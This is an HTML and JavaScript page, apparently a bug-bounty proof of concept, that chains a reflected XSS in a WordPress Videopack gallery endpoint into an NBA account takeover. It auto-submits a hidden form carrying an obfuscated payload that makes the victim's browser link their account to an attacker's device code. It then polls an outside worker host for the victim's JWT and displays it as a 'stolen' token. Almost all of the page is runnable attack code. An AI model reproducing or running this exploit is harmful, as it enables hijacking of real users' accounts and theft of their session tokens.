<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NBA rendezvous account-token PoC</title>
<style>
  body { font: 16px/1.45 system-ui, sans-serif; max-width: 760px; margin: 40px auto; padding: 0 20px; }
  textarea, button { display: block; width: 100%; box-sizing: border-box; margin: 12px 0; font: inherit; padding: 10px; }
  textarea { min-height: 160px; overflow-wrap: anywhere; }
  .muted { color: #555; }
  .ok { color: #075; }
  .error { color: #a00; }
</style>

<h1>NBA rendezvous account-token PoC</h1>
<p id="status">Starting automatic proof of concept…</p>
<p class="muted">Use only with a controlled NBA ID. The page creates a device code, triggers the Videopack XSS, polls for the linked account token, then displays and copies the full JWT.</p>
<textarea id="jwt" hidden readonly aria-label="Stolen JWT"></textarea>
<button id="copy" hidden type="button">Copy full JWT</button>

<form id="poc" method="post" enctype="multipart/form-data"
      action="https://videorulebook.nba.com/wp-admin/admin-ajax.php" hidden>
  <input name="action" value="kgvid_switch_gallery_page">
  <input name="security" value="8df5c8250d">
  <input name="page" value="1">
  <input name="last_video_id" value="0">
  <input name="query_atts[gallery_orderby]" value="menu_order">
  <input name="query_atts[gallery_order]" value="ASC">
  <input name="query_atts[gallery_per_page]" value="1">
  <input name="query_atts[gallery_id]" value="0">
  <input name="query_atts[gallery_exclude]" value="">
  <input name="query_atts[gallery_include]" value="3427">
  <input id="galleryThumb" name="query_atts[gallery_thumb]" value="250">
  <input name="query_atts[caption]" value="">
  <input name="query_atts[skin]" value="">
  <input name="query_atts[gallery_end]" value="close">
  <input name="query_atts[gallery_title]" value="false">
</form>

<script>
  const WORKER = "https://nba-rendezvous-ato-poc.h1-3989880-research.workers.dev";
  const CLEAN_URL = `${location.origin}${location.pathname}`;
  const SESSION_KEY = "nba-rendezvous-ato-poc";
  const status = document.getElementById("status");

  function charCodeExpression(value) {
    return `String.fromCharCode(${Array.from(value, character => character.charCodeAt(0)).join(",")})`;
  }

  function exploitPayload(code) {
    const identityEndpoint = charCodeExpression("https://identity.nba.com/api/v1/rendezvous");
    const fetchName = charCodeExpression("fetch");
    const timeoutName = charCodeExpression("setTimeout");
    const post = charCodeExpression("POST");
    const include = charCodeExpression("include");
    const contentType = charCodeExpression("Content-Type");
    const textPlain = charCodeExpression("text/plain");
    const requestBody = charCodeExpression(JSON.stringify({ code }));
    const handler = `top[${fetchName}](${identityEndpoint},{method:${post},credentials:${include},headers:{[${contentType}]:${textPlain}},body:${requestBody}});top[${timeoutName}](top.history.back.bind(top.history),10000)`;
    return `250\"><details open ontoggle=${handler}>`;
  }

  function findJwt(value) {
    if (typeof value === "string" && /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(value)) return value;
    if (Array.isArray(value)) {
      for (const item of value) {
        const found = findJwt(item);
        if (found) return found;
      }
    } else if (value && typeof value === "object") {
      for (const item of Object.values(value)) {
        const found = findJwt(item);
        if (found) return found;
      }
    }
    return null;
  }

  async function displayJwt(jwt) {
    const output = document.getElementById("jwt");
    const copy = document.getElementById("copy");
    output.hidden = false;
    output.value = jwt;
    copy.hidden = false;
    copy.onclick = async () => navigator.clipboard.writeText(jwt);
    try {
      await navigator.clipboard.writeText(jwt);
      status.textContent = "Account token captured. Full JWT displayed and copied.";
    } catch {
      status.textContent = "Account token captured. Full JWT displayed; use Copy full JWT.";
    }
    status.className = "ok";
    sessionStorage.removeItem(SESSION_KEY);
    alert(jwt);
  }

  async function poll(deviceId, code) {
    history.replaceState(null, "", CLEAN_URL);
    status.textContent = "Account link sent. Waiting for stolen JWT…";
    for (let attempt = 0; attempt < 60; attempt += 1) {
      const response = await fetch(`${WORKER}/poll?device=${encodeURIComponent(deviceId)}&code=${encodeURIComponent(code)}`, {
        cache: "no-store"
      });
      if (response.ok) {
        const body = await response.json();
        const jwt = findJwt(body);
        if (jwt) {
          await displayJwt(jwt);
          return;
        }
      }
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    throw new Error("No token returned before timeout.");
  }

  async function start() {
    const savedSession = sessionStorage.getItem(SESSION_KEY);
    if (savedSession) {
      const session = JSON.parse(savedSession);
      if (!session.deviceId || !session.code) throw new Error("Saved session is invalid.");
      await poll(session.deviceId, session.code);
      return;
    }

    const resume = location.hash.match(/^#resume=([^:]+):([A-Za-z0-9]{6})$/);
    if (resume) {
      await poll(decodeURIComponent(resume[1]), decodeURIComponent(resume[2]));
      return;
    }

    status.textContent = "Creating attacker device code…";
    const response = await fetch(`${WORKER}/session`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: "{}",
      cache: "no-store"
    });
    if (!response.ok) throw new Error("Device-code generation failed.");

    const session = await response.json();
    if (!session.deviceId || !session.code) throw new Error("Worker returned an invalid session.");

    status.textContent = "Device code created. Triggering Videopack XSS…";
    sessionStorage.setItem(SESSION_KEY, JSON.stringify(session));
    document.getElementById("galleryThumb").value = exploitPayload(session.code);
    document.getElementById("poc").submit();
  }

  start().catch(error => {
    status.className = "error";
    status.textContent = error.message;
  });

  addEventListener("pageshow", event => {
    if (event.persisted) start().catch(error => {
      status.className = "error";
      status.textContent = error.message;
    });
  });
</script>
